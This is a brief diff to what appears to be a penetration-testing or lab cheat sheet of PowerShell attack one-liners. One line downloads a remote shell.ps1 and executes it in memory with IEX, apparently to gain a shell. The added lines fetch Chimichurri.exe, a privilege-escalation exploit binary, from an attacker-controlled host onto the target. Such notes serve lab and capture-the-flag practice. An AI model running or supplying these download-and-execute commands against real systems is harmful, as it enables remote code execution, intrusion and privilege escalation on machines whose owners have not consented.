@@ -14,3 +14,7 @@ use below command. Don't use deploy command above for ps1 scripts,
 it wont work
 
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.90:8000/shell.ps1')"
+
+3. This script can be use to deploy a file, similar to script 1. But if script 1 fails, this may help
+
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.14:8081/Chimichurri.exe', 'c:\Users\Public\Downloads\Chimichurri.exe')"
